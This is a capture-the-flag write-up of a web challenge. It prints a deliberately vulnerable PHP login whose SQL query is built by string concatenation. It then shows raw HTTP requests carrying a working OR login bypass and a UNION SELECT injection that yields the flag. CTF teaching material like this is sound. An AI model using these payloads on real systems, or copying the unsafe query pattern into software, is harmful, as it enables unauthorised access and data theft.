# Houseplant CTF 2020 – I don't like needles

* **Category:** web
* **Points:** 50

## Challenge

> They make me SQueaL!
> 
> http://challs.houseplant.riceteacatpanda.wtf:30001
> 
> Dev: Tom

## Solution

The name of the challenge seems to be related to SQL injection.

The webpage contains an authentication form. The HTML source contains an interesting comment.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    
    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```

Connecting to `http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce` webpage you can read the source code.

```php
<?php

    // error_reporting(0);

    if (isset($_GET['sauce'])) {
        show_source("index.php");
        die();
    }

?>

<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <?php

        if ($_SERVER['REQUEST_METHOD'] == "POST") {
            
            require("config.php");

            if (isset($_POST["username"]) && isset($_POST["password"])) {

                $username = $_POST["username"];
                $password = $_POST["password"];

                if (strpos($password, "1") !== false) {
                    echo "<p style='color: red;'>Auth fail :(</p>";
                } else {

                    $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                    $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);
                    
                    if ($result === false) {
                        echo "<p style='color: red;'>I don't know what you did but it wasn't good.</p>";
                    } else {
                        if ($result->num_rows != 0) {
                            if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
                                echo "<p style='color: green;'>" . $FLAG . " :o</p>";
                            } else {
                                echo "<p style='color: green;'>Logged in :)</p>";
                            }
                        } else {
                            echo "<p style='color: red;'>Auth fail :(</p>";
                        }
                    }
                    
                }
            }
        }

    ?>

    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```

Authenticating with username `flagman69` should print the flag. The query is concatenating strings, so the website is vulnerable to SQL injection.

An additional control is present at the beginning on password value passed: a `strpos` function is used to check if the password contains the char `1`.

Trying to bypass the password check with a SQL injection will not print the flag after a correct login, maybe the user is not present.

```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1

username=flagman69&password='+OR+'2'='2

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:55:14 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 757
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <p style='color: green;'>Logged in :)</p>
    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```

Using the `UNION` clause you can discover that the `users` table has 3 columns and the second returned is the one with `username`. So the final UNION SQL injection can be crafted passing directly the value to bypass the last check: `flagman69` username.

```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1

username=m3ssap0&password='+UNION+SELECT+2,'flagman69',3+#

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:57:59 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 789
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <p style='color: green;'>rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t} :o</p>
    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```

So the flag is the following.

```
rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t}
```